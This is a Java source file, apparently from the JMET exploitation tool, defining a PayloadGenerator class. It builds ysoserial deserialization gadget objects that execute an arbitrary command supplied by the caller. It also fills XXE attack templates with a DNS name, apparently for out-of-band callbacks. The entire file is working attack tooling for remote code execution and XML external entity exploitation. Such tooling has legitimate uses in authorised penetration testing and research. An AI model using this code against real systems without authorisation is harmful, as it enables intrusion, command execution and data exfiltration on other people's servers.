package de.codewhite.jmet.payload.impl;

import de.codewhite.jmet.types.XXETypes;
import de.codewhite.jmet.types.YsoserialPayload;
import de.codewhite.jmet.wrapper.SerializableWrapper;

import java.io.Serializable;
import java.text.MessageFormat;
import java.util.List;

/**
 * Created by kaimatt.
 */
public class PayloadGenerator {



    public static List<ObjectPayloadItem> createGadgetObjectPayloads(List<YsoserialPayload> ysopayloads,List<ObjectPayloadItem> payloads, String cmd, boolean evaluateVariable, boolean isGadgetWrapping) {

        for (YsoserialPayload t : ysopayloads) {

            String cmdToExec = cmd;

            if (evaluateVariable) {
                cmdToExec = cmd.replace("§§", t.name());
            }

            Serializable gadget = (Serializable) ysoserial.payloads.ObjectPayload.Utils.makePayloadObject(t.name(), cmdToExec);
            if(isGadgetWrapping){
                gadget = new SerializableWrapper(gadget,2);
            }
            ObjectPayloadItem item = new ObjectPayloadItem(t.name(), cmdToExec, gadget);
            payloads.add(item);

        }
        return payloads;
    }

    public static List <TextPayloadItem> createXXETextPayloads(List<XXETypes> xxePayTypes, List <TextPayloadItem> payloads, String dnsName){

        for(XXETypes type: xxePayTypes){
            String xxeVector = MessageFormat.format(type.vector(),dnsName);
            payloads.add(new TextPayloadItem(type.name(),xxeVector));
        }

        return payloads;

    }

}
